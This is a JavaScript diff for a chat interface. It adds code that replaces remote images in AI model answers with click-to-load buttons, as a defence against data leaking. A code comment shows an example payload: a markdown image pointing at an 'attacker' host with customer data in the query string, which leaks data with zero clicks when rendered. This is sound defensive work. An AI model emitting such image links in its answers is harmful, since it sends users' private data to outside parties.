@@ -90,6 +90,46 @@ function toast(msg, opts) {
     c.appendChild(t);
     return t;
 }
+// #region remote-images —— 远程图片改为点击加载（审计 P1-E），勿删标记
+// 模型回答里出现 `![](https://attacker/?d=<客户数据>)` 时，浏览器渲染即外带
+// 数据、零点击。这里把跨源 http(s) 图片替换成占位按钮，用户点了才请求。
+function _isRemoteImageSrc(src, origin) {
+    var raw = String(src || '').trim();
+    if (!raw) return false;
+    try {
+        var abs = new URL(raw, (typeof location !== 'undefined' ? location.href : 'http://localhost/'));
+        if (abs.origin === (origin || (typeof location !== 'undefined' ? location.origin : abs.origin))) return false;
+        return abs.protocol === 'http:' || abs.protocol === 'https:';
+    } catch (e) {
+        return false;
+    }
+}
+
+function neutralizeRemoteImages(root) {
+    if (!root || !root.querySelectorAll) return;
+    var imgs = root.querySelectorAll('img[src]');
+    for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        var src = img.getAttribute('src') || '';
+        if (!_isRemoteImageSrc(src)) continue;
+        var abs = new URL(src, location.href);
+        var ph = document.createElement('button');
+        ph.type = 'button';
+        ph.className = 'remote-img-hold';
+        ph.textContent = '点击加载图片（' + abs.hostname + '）';
+        (function (url, alt, node) {
+            node.addEventListener('click', function () {
+                var real = document.createElement('img');
+                real.src = url;
+                real.alt = alt;
+                if (node.parentNode) node.parentNode.replaceChild(real, node);
+            });
+        })(abs.href, img.getAttribute('alt') || '', ph);
+        if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    }
+}
+// #endregion remote-images
+
 // #region html-escape-utils —— 这段被 tests_js/esc.test.js 按标记整体抽取测试，勿删标记
 // HTML 转义表：& < > 三个是文本上下文必需，" 和 ' 是属性上下文必需
 // （不转引号时，值里的一个 " 就能闭合 value="..." 并注入新属性）
